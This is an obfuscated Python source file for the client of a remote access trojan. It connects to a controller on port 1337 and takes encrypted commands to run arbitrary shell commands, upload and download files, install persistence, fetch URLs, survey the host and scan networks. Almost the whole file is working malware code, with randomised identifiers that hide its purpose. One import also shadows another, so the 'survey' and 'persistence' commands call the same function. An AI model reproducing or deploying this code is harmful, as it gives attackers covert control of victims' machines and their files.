#!/usr/bin/env python



# -*- coding: utf-8 -*-















import socket



import subprocess



import struct



import sys







try:



    from core.crypto import rzqOergcOwAqdICMWbxRcgDNsPNjYbRy, PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg, RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO



    from core.filesock import zyRDURipqNGanqOrKlMjDpZeOKOMCXCv, dAejAiYnebfrVxzpVgcryDbVphqVKBRb



    from core.persistence import neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj



    from core.scan import dWUvXWgjgMbqmUHgmrsEqhlXyUSUzJcv



    from core.survey import neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj



    from core.toolkit import jfVnKWHEQjvEuHzXJHsRmqQQfjrRiVXl, ijkKIiGzNDupwFqAipbKCsMXXZxjujeM



except ImportError as TdLsaVyGKlEwRTQPjlzufuYQZFTzmivb:



    print(TdLsaVyGKlEwRTQPjlzufuYQZFTzmivb)



    sys.exit(0)















pUEfjpqAaIsTIsrusiSqOVYnIgIqDNRp = sys.platform



KPfeKlstHbqOsnsqhnEvfbeFidvELQLu      = 'localhost'



GDNrurMSKhJhDOwMoGztvEIWAkaGjTcM      = 1337



hJmHkWgfcdVpoWzJhEuwmVCBRcrhZHtm    = 'b14ce95fa4c33ac2803782d18341869f'























def SlmlAKMIPbPQDhrIrwoBKCoWVDmBNljk():



    zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK = socket.socket()



    zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.connect((KPfeKlstHbqOsnsqhnEvfbeFidvELQLu, GDNrurMSKhJhDOwMoGztvEIWAkaGjTcM))







    ioXNZzSuBcfqlHeudtDIBlckbebEgEJT = RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO(zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK)







    while True:



        MDYujEgWYJqJAYrIJxqDhVSUMXamJOxR = zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.recv(1024)



        MDYujEgWYJqJAYrIJxqDhVSUMXamJOxR = rzqOergcOwAqdICMWbxRcgDNsPNjYbRy(MDYujEgWYJqJAYrIJxqDhVSUMXamJOxR, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)







        kDvmSbDWGREGzvDvJFahztwvIgzTOBjb, _, oAQVzlMVsxRYLhyULuJdubVINkXxrRGC = MDYujEgWYJqJAYrIJxqDhVSUMXamJOxR.partition(' ') 







        



        if kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'quit':



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.close()



            sys.exit(0)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'run':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = subprocess.Popen(oAQVzlMVsxRYLhyULuJdubVINkXxrRGC, shell=True,



                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,



                      stdin=subprocess.PIPE)



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl.stdout.read() + JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl.stderr.read()



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.sendall(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'download':



            for IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ in oAQVzlMVsxRYLhyULuJdubVINkXxrRGC.split():



                IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ = IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ.strip()



                dAejAiYnebfrVxzpVgcryDbVphqVKBRb(zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK, IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'upload':



            for IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ in oAQVzlMVsxRYLhyULuJdubVINkXxrRGC.split():



                IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ = IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ.strip()



                zyRDURipqNGanqOrKlMjDpZeOKOMCXCv(zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK, IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'rekey':



            ioXNZzSuBcfqlHeudtDIBlckbebEgEJT = RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO(zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'persistence':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj(pUEfjpqAaIsTIsrusiSqOVYnIgIqDNRp)



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'wget':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = jfVnKWHEQjvEuHzXJHsRmqQQfjrRiVXl(oAQVzlMVsxRYLhyULuJdubVINkXxrRGC)



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'unzip':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = ijkKIiGzNDupwFqAipbKCsMXXZxjujeM(oAQVzlMVsxRYLhyULuJdubVINkXxrRGC)



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'survey':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj(pUEfjpqAaIsTIsrusiSqOVYnIgIqDNRp)



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'scan':



            JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = dWUvXWgjgMbqmUHgmrsEqhlXyUSUzJcv(oAQVzlMVsxRYLhyULuJdubVINkXxrRGC)



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))























if __name__ == '__main__':



    SlmlAKMIPbPQDhrIrwoBKCoWVDmBNljk()



